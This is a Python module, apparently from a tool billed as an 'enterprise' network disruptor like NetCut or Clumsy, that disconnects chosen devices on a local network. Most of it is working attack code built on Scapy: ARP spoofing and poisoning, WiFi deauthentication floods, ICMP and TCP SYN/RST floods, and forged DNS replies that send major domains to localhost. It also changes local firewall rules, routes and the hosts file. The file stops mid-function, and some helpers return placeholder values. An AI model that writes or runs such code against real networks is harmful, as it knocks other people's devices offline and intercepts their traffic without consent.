# app/firewall/network_disruptor.py

import subprocess
import platform
import socket
import struct
import threading
import time
import ctypes
import os
from typing import Dict, List, Optional
from scapy.all import *
import psutil
from app.logs.logger import log_info, log_error

class NetworkDisruptor:
    """Enterprise-level network disconnection system similar to NetCut and Clumsy"""
    
    def __init__(self):
        self.blocked_devices = {}  # {ip: {method: status, thread: thread}}
        self.gateway_ip = None
        self.gateway_mac = None
        self.local_ip = None
        self.local_mac = None
        self.arp_spoof_threads = {}
        self.packet_drop_threads = {}
        self.deauth_threads = {}
        self.icmp_flood_threads = {}
        self.tcp_flood_threads = {}
        self.dns_poison_threads = {}
        self.is_running = False
        self.interface_name = None
        self.stop_event = threading.Event()
        
    def initialize(self):
        """Initialize network information with enterprise-level detection"""
        try:
            log_info("🔧 Initializing Enterprise Network Disruptor...")
            
            # Get local network information
            self.local_ip = self._get_local_ip()
            log_info(f"📡 Local IP detected: {self.local_ip}")
            
            self.local_mac = self._get_local_mac()
            log_info(f"📡 Local MAC detected: {self.local_mac}")
            
            self.gateway_ip = self._get_gateway_ip()
            log_info(f"📡 Gateway IP detected: {self.gateway_ip}")
            
            self.gateway_mac = self._get_mac_address(self.gateway_ip)
            log_info(f"📡 Gateway MAC detected: {self.gateway_mac}")
            
            self.interface_name = self._get_interface_name()
            log_info(f"📡 Interface name detected: {self.interface_name}")
            
            # Validate critical information
            if not self.local_ip or self.local_ip == "127.0.0.1":
                log_error("❌ Failed to get valid local IP address")
                return False
                
            if not self.gateway_ip:
                log_error("❌ Failed to get gateway IP address")
                return False
                
            if not self.interface_name:
                log_error("❌ Failed to get network interface name")
                return False
            
            log_info("✅ Enterprise Network Disruptor initialized successfully")
            log_info(f"📊 Network Info - Local IP: {self.local_ip}, Gateway IP: {self.gateway_ip}")
            log_info(f"📊 Network Info - Local MAC: {self.local_mac}, Gateway MAC: {self.gateway_mac}")
            log_info(f"📊 Network Info - Interface: {self.interface_name}")
            
            return True
        except Exception as e:
            log_error(f"❌ Failed to initialize Network Disruptor: {e}")
            return False
    
    def _get_local_ip(self) -> str:
        """Get local IP address with enterprise-level detection"""
        try:
            # Method 1: Connect to remote address
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            return local_ip
        except:
            try:
                # Method 2: Use psutil to find active interface
                interfaces = psutil.net_if_addrs()
                for interface_name, interface_addresses in interfaces.items():
                    if interface_name.startswith(('Ethernet', 'Wi-Fi', 'WiFi', 'WLAN')):
                        for addr in interface_addresses:
                            if addr.family == socket.AF_INET and not addr.address.startswith('127.'):
                                return addr.address
                return "127.0.0.1"
            except:
                return "127.0.0.1"
    
    def _get_local_mac(self) -> str:
        """Get local MAC address with enterprise-level detection"""
        try:
            interfaces = psutil.net_if_addrs()
            for interface_name, interface_addresses in interfaces.items():
                for addr in interface_addresses:
                    if addr.family == socket.AF_INET and addr.address == self.local_ip:
                        # Get MAC for this interface
                        for mac_addr in interface_addresses:
                            if mac_addr.family == psutil.AF_LINK:
                                return mac_addr.address.replace('-', ':')
            return "00:00:00:00:00:00"
        except:
            return "00:00:00:00:00:00"
    
    def _get_gateway_ip(self) -> str:
        """Get gateway IP address with enterprise-level detection"""
        try:
            # Use socket-based approach to get gateway
            # Method 1: Try to connect to external address and get route
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 80))
                local_ip = s.getsockname()[0]
                s.close()
                
                # Assume gateway is local IP with .1
                if local_ip:
                    parts = local_ip.split('.')
                    if len(parts) == 4:
                        gateway_ip = f"{parts[0]}.{parts[1]}.{parts[2]}.1"
                        log_info(f"Detected gateway IP: {gateway_ip}")
                        return gateway_ip
            except:
                pass
            
            # Method 2: Use common gateway addresses
            common_gateways = ["192.168.1.1", "192.168.0.1", "10.0.0.1", "10.0.1.1"]
            for gateway in common_gateways:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1.0)
                    result = sock.connect_ex((gateway, 80))
                    sock.close()
                    if result == 0:
                        log_info(f"Found working gateway: {gateway}")
                        return gateway
                except:
                    continue
            
            # Fallback to default
            return "192.168.1.1"
            
        except Exception as e:
            log_error(f"Error getting gateway IP: {e}")
            return "192.168.1.1"
    
    def _get_mac_address(self, ip: str) -> str:
        """Get MAC address for an IP with enterprise-level detection"""
        try:
            # Use socket-based approach instead of subprocess
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1.0)
            
            # Try to connect to populate ARP table
            try:
                sock.connect((ip, 80))
                sock.close()
            except:
                pass
            
            # For now, return a placeholder MAC since we can't easily get it without subprocess
            # In a real implementation, you'd need to parse the ARP table
            return "ff:ff:ff:ff:ff:ff"  # Broadcast MAC as fallback
            
        except Exception as e:
            log_error(f"Error getting MAC for {ip}: {e}")
            return "ff:ff:ff:ff:ff:ff"
    
    def _get_interface_name(self) -> str:
        """Get network interface name with enterprise-level detection"""
        try:
            # Method 1: Use psutil to find active interface
            interfaces = psutil.net_if_addrs()
            for interface_name, interface_addresses in interfaces.items():
                for addr in interface_addresses:
                    if addr.family == socket.AF_INET and addr.address == self.local_ip:
                        return interface_name
            
            # Method 2: Use Windows netsh
            if platform.system() == "Windows":
                result = subprocess.run(
                    ["netsh", "interface", "show", "interface"], 
                    capture_output=True, text=True, timeout=5
                )
                if result.returncode == 0:
                    lines = result.stdout.split('\n')
                    for line in lines:
                        if 'Enabled' in line and ('Ethernet' in line or 'Wi-Fi' in line):
                            parts = line.split()
                            if len(parts) >= 4:
                                return parts[3]
            
            # Fallback: Return first available interface
            interfaces = psutil.net_if_addrs()
            for interface_name in interfaces.keys():
                if interface_name.startswith(('Ethernet', 'Wi-Fi', 'WiFi', 'WLAN')):
                    return interface_name
            
            return list(interfaces.keys())[0] if interfaces else "eth0"
        except Exception as e:
            log_error(f"Error getting interface name: {e}")
            return "eth0"
    
    def disconnect_device(self, target_ip: str, methods: List[str] = None) -> bool:
        """Disconnect a device using enterprise-level methods like NetCut/Clumsy"""
        if methods is None:
            methods = ["arp_spoof", "packet_drop", "route_blackhole", "firewall", "icmp_flood", "tcp_flood", "dns_poison"]
        
        try:
            log_info(f"🎯 Starting enterprise disconnection for {target_ip}")
            log_info(f"🎯 Available methods: {methods}")
            log_info(f"🎯 Network disruptor running: {self.is_running}")
            log_info(f"🎯 Local IP: {self.local_ip}, Gateway IP: {self.gateway_ip}")
            
            if target_ip in self.blocked_devices:
                log_info(f"Device {target_ip} is already being disrupted")
                return True
            
            # Get target MAC address
            target_mac = self._get_mac_address(target_ip)
            log_info(f"Target MAC for {target_ip}: {target_mac}")
            
            self.blocked_devices[target_ip] = {
                'methods': {},
                'target_mac': target_mac,
                'start_time': time.time()
            }
            
            success_count = 0
            
            # Method 1: Enhanced Enterprise ARP Spoofing (like NetCut)
            if "arp_spoof" in methods:
                if self._start_arp_spoofing(target_ip, target_mac):
                    self.blocked_devices[target_ip]['methods']['arp_spoof'] = True
                    success_count += 1
                    log_info(f"Enterprise ARP spoofing started for {target_ip}")
            
            # Method 2: Enhanced Enterprise Packet Dropping (like Clumsy)
            if "packet_drop" in methods:
                if self._start_packet_dropping(target_ip):
                    self.blocked_devices[target_ip]['methods']['packet_drop'] = True
                    success_count += 1
                    log_info(f"Enterprise packet dropping started for {target_ip}")
            
            # Method 3: Enterprise Route Blackhole
            if "route_blackhole" in methods:
                if self._add_blackhole_route(target_ip):
                    self.blocked_devices[target_ip]['methods']['route_blackhole'] = True
                    success_count += 1
                    log_info(f"Enterprise blackhole route added for {target_ip}")
            
            # Method 4: Enterprise Firewall Rules
            if "firewall" in methods:
                if self._add_firewall_rule(target_ip):
                    self.blocked_devices[target_ip]['methods']['firewall'] = True
                    success_count += 1
                    log_info(f"Enterprise firewall rule added for {target_ip}")
            
            # Method 5: Windows-specific aggressive blocking
            if platform.system() == "Windows":
                if self._add_windows_aggressive_blocking(target_ip):
                    self.blocked_devices[target_ip]['methods']['windows_aggressive'] = True
                    success_count += 1
                    log_info(f"Windows aggressive blocking added for {target_ip}")
            
            # Method 6: Enterprise WiFi Deauthentication (like NetCut)
            if "deauth" in methods:
                if self._start_deauth_attack(target_ip, target_mac):
                    self.blocked_devices[target_ip]['methods']['deauth'] = True
                    success_count += 1
                    log_info(f"Enterprise deauth attack started for {target_ip}")
            
            # Method 7: ICMP Flood Attack (NetCut-style)
            if "icmp_flood" in methods:
                if self._start_icmp_flood(target_ip):
                    self.blocked_devices[target_ip]['methods']['icmp_flood'] = True
                    success_count += 1
                    log_info(f"Enterprise ICMP flood started for {target_ip}")
            
            # Method 8: TCP SYN Flood Attack (NetCut-style)
            if "tcp_flood" in methods:
                if self._start_tcp_flood(target_ip):
                    self.blocked_devices[target_ip]['methods']['tcp_flood'] = True
                    success_count += 1
                    log_info(f"Enterprise TCP flood started for {target_ip}")
            
            # Method 9: DNS Poisoning Attack
            if "dns_poison" in methods:
                if self._start_dns_poisoning(target_ip):
                    self.blocked_devices[target_ip]['methods']['dns_poison'] = True
                    success_count += 1
                    log_info(f"Enterprise DNS poisoning started for {target_ip}")
            
            if success_count > 0:
                log_info(f"🎯 Enterprise disconnection successful for {target_ip} using {success_count} methods")
                return True
            else:
                log_error(f"❌ Enterprise disconnection failed for {target_ip}")
                del self.blocked_devices[target_ip]
                return False
                
        except Exception as e:
            log_error(f"Error in enterprise disconnection for {target_ip}: {e}")
            if target_ip in self.blocked_devices:
                del self.blocked_devices[target_ip]
            return False
    
    def _start_arp_spoofing(self, target_ip: str, target_mac: str) -> bool:
        """Start enterprise-level ARP spoofing attack (like NetCut)"""
        try:
            def arp_spoof_worker():
                log_info(f"🎯 Starting enterprise ARP spoofing attack on {target_ip} (MAC: {target_mac})")
                
                while target_ip in self.blocked_devices and self.is_running and not self.stop_event.is_set():
                    try:
                        # Enterprise-level ARP spoofing - send multiple packets with different techniques
                        for _ in range(50):  # Increased to 50 packets per cycle for maximum effect
                            # Technique 1: Standard ARP spoofing - tell target we are gateway
                            # Create proper Ethernet frame with ARP
                            arp_packet = Ether(dst=target_mac, src=self.local_mac) / ARP(
                                op=2,  # ARP reply
                                psrc=self.gateway_ip,  # Spoof gateway IP
                                pdst=target_ip,  # Target IP
                                hwsrc=self.local_mac,  # Our MAC
                                hwdst=target_mac  # Target MAC
                            )
                            send(arp_packet, verbose=False, iface=self.interface_name)
                            
                            # Technique 2: Reverse ARP spoofing - tell gateway we are target
                            arp_packet2 = Ether(dst=self.gateway_mac, src=self.local_mac) / ARP(
                                op=2,  # ARP reply
                                psrc=target_ip,  # Spoof target IP
                                pdst=self.gateway_ip,  # Gateway IP
                                hwsrc=self.local_mac,  # Our MAC
                                hwdst=self.gateway_mac  # Gateway MAC
                            )
                            send(arp_packet2, verbose=False, iface=self.interface_name)
                            
                            # Technique 3: Gratuitous ARP - announce target IP as ours (fixed to avoid warnings)
                            gratuitous_arp = Ether(dst="ff:ff:ff:ff:ff:ff", src=self.local_mac) / ARP(
                                op=2,
                                psrc=target_ip,
                                pdst=target_ip,
                                hwsrc=self.local_mac,
                                hwdst="ff:ff:ff:ff:ff:ff"
                            )
                            send(gratuitous_arp, verbose=False, iface=self.interface_name)
                            
                            # Technique 4: Enhanced ARP poisoning with multiple targets (fixed)
                            for spoof_ip in [self.gateway_ip, target_ip, "8.8.8.8", "1.1.1.1"]:
                                poison_arp = Ether(dst=target_mac, src=self.local_mac) / ARP(
                                    op=2,
                                    psrc=spoof_ip,
                                    pdst=target_ip,
                                    hwsrc=self.local_mac,
                                    hwdst=target_mac
                                )
                                send(poison_arp, verbose=False, iface=self.interface_name)
                        
                        time.sleep(0.05)  # Send every 0.05 seconds for maximum aggression
                        
                    except Exception as e:
                        log_error(f"Enterprise ARP spoofing error for {target_ip}: {e}")
                        break
                
                log_info(f"🛑 Enterprise ARP spoofing stopped for {target_ip}")
            
            # Start ARP spoofing thread
            thread = threading.Thread(target=arp_spoof_worker, daemon=True)
            thread.start()
            self.arp_spoof_threads[target_ip] = thread
            
            return True
            
        except Exception as e:
            log_error(f"Failed to start enterprise ARP spoofing for {target_ip}: {e}")
            return False
    
    def _start_packet_dropping(self, target_ip: str) -> bool:
        """Start enterprise-level packet dropping (like Clumsy)"""
        try:
            def packet_drop_worker():
                log_info(f"🎯 Starting enterprise packet dropping attack on {target_ip}")
                
                while target_ip in self.blocked_devices and self.is_running and not self.stop_event.is_set():
                    try:
                        # Enterprise-level packet dropping
                        def packet_handler(packet):
                            if IP in packet:
                                if packet[IP].src == target_ip or packet[IP].dst == target_ip:
                                    # Drop packet by not returning it
                                    log_error(f"🚫 Enterprise dropped packet: {packet[IP].src} -> {packet[IP].dst}")
                                    return
                            return packet
                        
                        # Sniff packets and drop them with enterprise-level filtering
                        sniff(
                            filter=f"host {target_ip} or dst {target_ip} or src {target_ip}",
                            prn=packet_handler,
                            store=0,
                            timeout=0.3
                        )
                        
                        # Enterprise-level connection termination - send RST packets to common ports
                        try:
                            common_ports = [80, 443, 22, 21, 25, 53, 110, 143, 993, 995, 8080, 8443]
                            for port in common_ports:
                                try:
                                    rst_packet = IP(dst=target_ip)/TCP(flags="R", dport=port)
                                    send(rst_packet, verbose=False, iface=self.interface_name)
                                except:
                                    pass
                        except:
                            pass
                        
                    except Exception as e:
                        log_error(f"Enterprise packet dropping error for {target_ip}: {e}")
                        break
                
                log_info(f"🛑 Enterprise packet dropping stopped for {target_ip}")
            
            # Start packet dropping thread
            thread = threading.Thread(target=packet_drop_worker, daemon=True)
            thread.start()
            self.packet_drop_threads[target_ip] = thread
            
            return True
            
        except Exception as e:
            log_error(f"Failed to start enterprise packet dropping for {target_ip}: {e}")
            return False
    
    def _add_blackhole_route(self, target_ip: str) -> bool:
        """Add enterprise-level blackhole route to drop traffic"""
        try:
            if platform.system() == "Windows":
                # Enterprise Windows route manipulation
                subprocess.run([
                    "route", "add", target_ip, "0.0.0.0", "if", "1", "metric", "1"
                ], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                
                # Also add to hosts file for additional blocking
                hosts_entry = f"127.0.0.1 {target_ip}\n"
                hosts_file = r"C:\Windows\System32\drivers\etc\hosts"
                try:
                    with open(hosts_file, 'a') as f:
                        f.write(hosts_entry)
                except:
                    pass
            else:
                # Enterprise Linux route manipulation
                subprocess.run([
                    "ip", "route", "add", "blackhole", target_ip
                ], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            return True
            
        except subprocess.CalledProcessError:
            return False
    
    def _add_firewall_rule(self, target_ip: str) -> bool:
        """Add enterprise firewall rules for target IP"""
        try:
            if platform.system() == "Windows":
                # Enterprise Windows Firewall rules
                rules = [
                    ["netsh", "advfirewall", "firewall", "add", "rule", 
                     "name=PulseDropEnterprise_Block_Out_" + target_ip,
                     "dir=out", "action=block", f"remoteip={target_ip}"],
                    ["netsh", "advfirewall", "firewall", "add", "rule", 
                     "name=PulseDropEnterprise_Block_In_" + target_ip,
                     "dir=in", "action=block", f"remoteip={target_ip}"],
                    ["netsh", "advfirewall", "firewall", "add", "rule", 
                     "name=PulseDropEnterprise_Block_ICMP_" + target_ip,
                     "protocol=icmpv4", "action=block", f"remoteip={target_ip}"],
                    ["netsh", "advfirewall", "firewall", "add", "rule", 
                     "name=PulseDropEnterprise_Block_TCP_" + target_ip,
                     "protocol=tcp", "action=block", f"remoteip={target_ip}"],
                    ["netsh", "advfirewall", "firewall", "add", "rule", 
                     "name=PulseDropEnterprise_Block_UDP_" + target_ip,
                     "protocol=udp", "action=block", f"remoteip={target_ip}"]
                ]
                
                for rule in rules:
                    try:
                        # Use subprocess with silent output to reduce spam
                        result = subprocess.run(rule, capture_output=True, text=True, timeout=5)
                        if result.returncode != 0:
                            log_error(f"Firewall rule failed: {' '.join(rule)}")
                    except subprocess.TimeoutExpired:
                        log_error(f"Firewall rule timeout: {' '.join(rule)}")
                    except Exception as e:
                        log_error(f"Firewall rule error: {e}")
                
                log_info(f"🔒 Added enterprise firewall rules for {target_ip}")
            else:
                # Enterprise iptables rules (Linux)
                rules = [
                    ["iptables", "-A", "OUTPUT", "-d", target_ip, "-j", "DROP"],
                    ["iptables", "-A", "INPUT", "-s", target_ip, "-j", "DROP"],
                    ["iptables", "-A", "FORWARD", "-d", target_ip, "-j", "DROP"],
                    ["iptables", "-A", "FORWARD", "-s", target_ip, "-j", "DROP"]
                ]
                
                for rule in rules:
                    try:
                        result = subprocess.run(rule, capture_output=True, text=True, timeout=5)
                        if result.returncode != 0:
                            log_error(f"iptables rule failed: {' '.join(rule)}")
                    except subprocess.TimeoutExpired:
                        log_error(f"iptables rule timeout: {' '.join(rule)}")
                    except Exception as e:
                        log_error(f"iptables rule error: {e}")
                
                log_info(f"🔒 Added enterprise iptables rules for {target_ip}")
            
            return True
            
        except Exception as e:
            log_error(f"Failed to add enterprise firewall rules for {target_ip}: {e}")
            return False
    
    def _add_windows_aggressive_blocking(self, target_ip: str) -> bool:
        """Add aggressive Windows-specific blocking methods"""
        try:
            if platform.system() == "Windows":
                # Method 1: Modify hosts file to redirect to localhost
                try:
                    hosts_file = r"C:\Windows\System32\drivers\etc\hosts"
                    hosts_entry = f"\n{target_ip} 127.0.0.1 # PulseDropEnterprise Block\n"
                    
                    with open(hosts_file, 'a') as f:
                        f.write(hosts_entry)
                    log_info(f"🔒 Added {target_ip} to hosts file")
                except Exception as e:
                    log_error(f"Could not modify hosts file: {e}")
                
                # Method 2: Add static ARP entry to point to invalid MAC
                try:
                    result = subprocess.run([
                        "arp", "-s", target_ip, "00-00-00-00-00-00"
                    ], capture_output=True, text=True, timeout=5)
                    if result.returncode == 0:
                        log_info(f"🔒 Added static ARP entry for {target_ip}")
                    else:
                        log_error(f"ARP entry failed: {result.stderr}")
                except subprocess.TimeoutExpired:
                    log_error(f"ARP entry timeout for {target_ip}")
                except Exception as e:
                    log_error(f"Could not add ARP entry: {e}")
                
                # Method 3: Add route to null interface
                try:
                    result = subprocess.run([
                        "route", "add", target_ip, "0.0.0.0", "if", "1", "metric", "1"
                    ], capture_output=True, text=True, timeout=5)
                    if result.returncode == 0:
                        log_info(f"🔒 Added null route for {target_ip}")
                    else:
                        log_error(f"Null route failed: {result.stderr}")
                except subprocess.TimeoutExpired:
                    log_error(f"Null route timeout for {target_ip}")
                except Exception as e:
                    log_error(f"Could not add null route: {e}")
                
                # Method 4: Use netsh to block at interface level
                try:
                    result = subprocess.run([
                        "netsh", "interface", "ipv4", "add", "route", target_ip, "0.0.0.0", "1", "metric=1"
                    ], capture_output=True, text=True, timeout=5)
                    if result.returncode == 0:
                        log_info(f"🔒 Added interface-level route for {target_ip}")
                    else:
                        log_error(f"Interface route failed: {result.stderr}")
                except subprocess.TimeoutExpired:
                    log_error(f"Interface route timeout for {target_ip}")
                except Exception as e:
                    log_error(f"Could not add interface route: {e}")
                
                return True
            else:
                log_error("Windows aggressive blocking only works on Windows")
                return False
                
        except Exception as e:
            log_error(f"Windows aggressive blocking failed for {target_ip}: {e}")
            return False
    
    def _start_deauth_attack(self, target_ip: str, target_mac: str) -> bool:
        """Start enterprise-level WiFi deauthentication attack (like NetCut)"""
        try:
            def deauth_worker():
                log_info(f"🎯 Starting enterprise deauth attack on {target_ip} (MAC: {target_mac})")
                
                while target_ip in self.blocked_devices and self.is_running:
                    try:
                        # Enterprise-level deauthentication
                        deauth_packet = RadioTap() / Dot11(
                            addr1=target_mac,
                            addr2=self.local_mac,
                            addr3=self.local_mac
                        ) / Dot11Deauth()
                        
                        send(deauth_packet, verbose=False, iface=self.interface_name)
                        
                        # Enterprise-level disassociation
                        disassoc_packet = RadioTap() / Dot11(
                            addr1=target_mac,
                            addr2=self.local_mac,
                            addr3=self.local_mac
                        ) / Dot11Disas()
                        
                        send(disassoc_packet, verbose=False, iface=self.interface_name)
                        
                        # Enterprise-level beacon frame spoofing
                        beacon_packet = RadioTap() / Dot11(
                            addr1="ff:ff:ff:ff:ff:ff",
                            addr2=self.local_mac,
                            addr3=self.local_mac
                        ) / Dot11Beacon()
                        
                        send(beacon_packet, verbose=False, iface=self.interface_name)
                        
                        time.sleep(0.05)  # Send very frequently for maximum effect
                        
                    except Exception as e:
                        log_error(f"Enterprise deauth attack error for {target_ip}: {e}")
                        break
                
                log_info(f"🛑 Enterprise deauth attack stopped for {target_ip}")
            
            # Start deauth thread
            thread = threading.Thread(target=deauth_worker, daemon=True)
            thread.start()
            self.deauth_threads[target_ip] = thread
            
            return True
            
        except Exception as e:
            log_error(f"Failed to start enterprise deauth attack for {target_ip}: {e}")
            return False
    
    def _start_icmp_flood(self, target_ip: str) -> bool:
        """Start ICMP flood attack (NetCut-style)"""
        try:
            def icmp_flood_worker():
                log_info(f"🎯 Starting enterprise ICMP flood attack on {target_ip}")
                
                while target_ip in self.blocked_devices and self.is_running:
                    try:
                        # Send multiple ICMP packets
                        for _ in range(50):  # Send 50 ICMP packets per cycle
                            # ICMP Echo Request (ping)
                            icmp_packet = IP(dst=target_ip)/ICMP(type=8, code=0)
                            send(icmp_packet, verbose=False, iface=self.interface_name)
                            
                            # ICMP Destination Unreachable
                            icmp_unreach = IP(dst=target_ip)/ICMP(type=3, code=1)
                            send(icmp_unreach, verbose=False, iface=self.interface_name)
                            
                            # ICMP Time Exceeded
                            icmp_timeout = IP(dst=target_ip)/ICMP(type=11, code=0)
                            send(icmp_timeout, verbose=False, iface=self.interface_name)
                        
                        time.sleep(0.05)  # Very fast sending
                        
                    except Exception as e:
                        log_error(f"Enterprise ICMP flood error for {target_ip}: {e}")
                        break
                
                log_info(f"🛑 Enterprise ICMP flood stopped for {target_ip}")
            
            # Start ICMP flood thread
            thread = threading.Thread(target=icmp_flood_worker, daemon=True)
            thread.start()
            self.icmp_flood_threads[target_ip] = thread
            
            return True
            
        except Exception as e:
            log_error(f"Failed to start enterprise ICMP flood for {target_ip}: {e}")
            return False
    
    def _start_tcp_flood(self, target_ip: str) -> bool:
        """Start TCP SYN flood attack (NetCut-style)"""
        try:
            def tcp_flood_worker():
                log_info(f"🎯 Starting enterprise TCP flood attack on {target_ip}")
                
                while target_ip in self.blocked_devices and self.is_running:
                    try:
                        # Send TCP SYN packets to multiple ports
                        for port in [80, 443, 22, 21, 25, 53, 110, 143, 993, 995]:
                            # TCP SYN packet
                            tcp_syn = IP(dst=target_ip)/TCP(sport=RandShort(), dport=port, flags="S")
                            send(tcp_syn, verbose=False, iface=self.interface_name)
                            
                            # TCP RST packet to terminate connections
                            tcp_rst = IP(dst=target_ip)/TCP(sport=RandShort(), dport=port, flags="R")
                            send(tcp_rst, verbose=False, iface=self.interface_name)
                            
                            # TCP FIN packet
                            tcp_fin = IP(dst=target_ip)/TCP(sport=RandShort(), dport=port, flags="F")
                            send(tcp_fin, verbose=False, iface=self.interface_name)
                        
                        time.sleep(0.05)  # Very fast sending
                        
                    except Exception as e:
                        log_error(f"Enterprise TCP flood error for {target_ip}: {e}")
                        break
                
                log_info(f"🛑 Enterprise TCP flood stopped for {target_ip}")
            
            # Start TCP flood thread
            thread = threading.Thread(target=tcp_flood_worker, daemon=True)
            thread.start()
            self.tcp_flood_threads[target_ip] = thread
            
            return True
            
        except Exception as e:
            log_error(f"Failed to start enterprise TCP flood for {target_ip}: {e}")
            return False
    
    def _start_dns_poisoning(self, target_ip: str) -> bool:
        """Start DNS poisoning attack"""
        try:
            def dns_poison_worker():
                log_info(f"🎯 Starting enterprise DNS poisoning attack on {target_ip}")
                
                while target_ip in self.blocked_devices and self.is_running:
                    try:
                        # Send fake DNS responses
                        for domain in ["google.com", "facebook.com", "youtube.com", "amazon.com", "netflix.com"]:
                            # Fake DNS response redirecting to localhost
                            dns_response = IP(dst=target_ip)/UDP(sport=53, dport=RandShort())/DNS(
                                qr=1,  # Response
                                aa=1,  # Authoritative
                                qd=DNSQR(qname=domain),
                                an=DNSRR(rrname=domain, type="A", rdata="127.0.0.1")
                            )
                            send(dns_response, verbose=False, iface=self.interface_name)
                        
                        time.sleep(0.1)  # Send every 0.1 seconds
                        
                    except Exception as e:
                        log_error(f"Enterprise DNS poisoning error for {target_ip}: {e}")
                        break
                
                log_info(f"🛑 Enterprise DNS poisoning stopped for {target_ip}")
            
            # Start DNS poisoning thread
            thread = threading.Thread(target=dns_poison_worker, daemon=True)
            thread.start()
            self.dns_poison_threads[target_ip] = thread
            
            return True
            
        except Exception as e:
            log_error(f"Failed to start enterprise DNS poisoning for {target_ip}: {e}")
            return False
    
    def reconnect_device(self, target_ip: str) -> bool:
        """Reconnect a device by stopping all enterprise disruption methods"""
        try:
            if target_ip not in self.blocked_devices:
                log_error(f"Device {target_ip} is not being disrupted")
                return True
            
            device_info = self.blocked_devices[target_ip]
            success_count = 0
            
            # Stop ARP spoofing
            if "arp_spoof" in device_info['methods']:
                if target_ip in self.arp_spoof_threads:
                    del self.arp_spoof_threads[target_ip]
                device_info['methods']['arp_spoof'] = False
                success_count += 1
            
            # Stop packet dropping
            if "packet_drop" in device_info['methods']:
                if target_ip in self.packet_drop_threads:
                    del self.packet_drop_threads[target_ip]
                device_info['methods']['packet_drop'] = False
                success_count += 1
            
            # Stop deauth attack
            if "deauth" in device_info['methods']:
                if target_ip in self.deauth_threads:
                    del self.deauth_threads[target_ip]
                device_info['methods']['deauth'] = False
                success_count += 1
            
            # Stop ICMP flood
            if "icmp_flood" in device_info['methods']:
                if target_ip in self.icmp_flood_threads:
                    del self.icmp_flood_threads[target_ip]
                device_info['methods']['icmp_flood'] = False
                success_count += 1
            
            # Stop TCP flood
            if "tcp_flood" in device_info['methods']:
                if target_ip in self.tcp_flood_threads:
                    del self.tcp_flood_threads[target_ip]
                device_info['methods']['tcp_flood'] = False
                success_count += 1
            
            # Stop DNS poisoning
            if "dns_poison" in device_info['methods']:
                if target_ip in self.dns_poison_threads:
                    del self.dns_poison_threads[target_ip]
                device_info['methods']['dns_poison'] = False
                success_count += 1
            
            # Remove blackhole route
            if "route_blackhole" in device_info['methods']:
                if self._remove_blackhole_route(target_ip):
                    device_info['methods']['route_blackhole'] = False
                    success_count += 1
            
            # Remove firewall rules
            if "firewall" in device_info['methods']:
                if self._remove_firewall_rule(target_ip):
                    device_info['methods']['firewall'] = False
                    success_count += 1
            
            # Remove Windows aggressive blocking
            if "windows_aggressive" in device_info['methods']:
                if self._remove_windows_aggressive_blocking(target_ip):
                    device_info['methods']['windows_aggressive'] = False
                    success_count += 1
            
            # Remove from blocked devices
            del self.blocked_devices[target_ip]
            
            log_info(f"✅ Enterprise reconnection successful for {target_ip}")
            return True
            
        except Exception as e:
            log_error(f"Error in enterprise reconnection for {target_ip}: {e}")
            return False
    
    def _remove_blackhole_route(self, target_ip: str) -> bool:
        """Remove enterprise-level blackhole route"""
        try:
            if platform.system() == "Windows":
                subprocess.run([
                    "route", "delete", target_ip
                ], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            else:
                subprocess.run([
                    "ip", "route", "del", "blackhole", target_ip
                ], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            return True
            
        except subprocess.CalledProcessError:
            return False
    
    def _remove_firewall_rule(self, target_ip: str) -> bool:
        """Remove enterprise firewall rules for target IP"""
        try:
            if platform.system() == "Windows":
                # Remove enterprise Windows Firewall rules
                rule_names = [
                    f"PulseDropEnterprise_Block_Out_{target_ip}",
                    f"PulseDropEnterprise_Block_In_{target_ip}",
                    f"PulseDropEnterprise_Block_ICMP_{target_ip}",
                    f"PulseDropEnterprise_Block_TCP_{target_ip}",
                    f"PulseDropEnterprise_Block_UDP_{target_ip}"
                ]
                
                for rule_name in rule_names:
                    try:
                        result = subprocess.run([
                            "netsh", "advfirewall", "firewall", "delete", "rule", f"name={rule_name}"
                        ], capture_output=True, text=True, timeout=5)
                        if result.returncode != 0:
                            log_error(f"Firewall rule removal failed: {rule_name}")
                    except subprocess.TimeoutExpired:
                        log_error(f"Firewall rule removal timeout: {rule_name}")
                    except Exception as e:
                        log_error(f"Firewall rule removal error: {e}")
                
                log_info(f"🔓 Removed enterprise firewall rules for {target_ip}")
            else:
                # Remove enterprise iptables rules (Linux)
                rules = [
                    ["iptables", "-D", "OUTPUT", "-d", target_ip, "-j", "DROP"],
                    ["iptables", "-D", "INPUT", "-s", target_ip, "-j", "DROP"],
                    ["iptables", "-D", "FORWARD", "-d", target_ip, "-j", "DROP"],
                    ["iptables", "-D", "FORWARD", "-s", target_ip, "-j", "DROP"]
                ]
                
                for rule in rules:
                    try:
                        result = subprocess.run(rule, capture_output=True, text=True, timeout=5)
                        if result.returncode != 0:
                            log_error(f"iptables rule removal failed: {' '.join(rule)}")
                    except subprocess.TimeoutExpired:
                        log_error(f"iptables rule removal timeout: {' '.join(rule)}")
                    except Exception as e:
                        log_error(f"iptables rule removal error: {e}")
                
                log_info(f"🔓 Removed enterprise iptables rules for {target_ip}")
            
            return True
            
        except Exception as e:
            log_error(f"Failed to remove enterprise firewall rules for {target_ip}: {e}")
            return False
    
    def _remove_windows_aggressive_blocking(self, target_ip: str) -> bool:
        """Remove aggressive Windows-specific blocking methods"""
        try:
            if platform.system() == "Windows":
                # Method 1: Remove from hosts file
                try:
                    hosts_file = r"C:\Windows\System32\drivers\etc\hosts"
                    with open(hosts_file, 'r') as f:
                        lines = f.readlines()
                    
                    # Filter out the entry for this IP
                    filtered_lines = [line for line in lines if target_ip not in line or "PulseDropEnterprise Block" not in line]
                    
                    with open(hosts_file, 'w') as f:
                        f.writelines(filtered_lines)
                    log_info(f"🔓 Removed {target_ip} from hosts file")
                except Exception as e:
                    log_error(f"Could not modify hosts file: {e}")
                
                # Method 2: Remove static ARP entry
                try:
                    result = subprocess.run([
                        "arp", "-d", target_ip
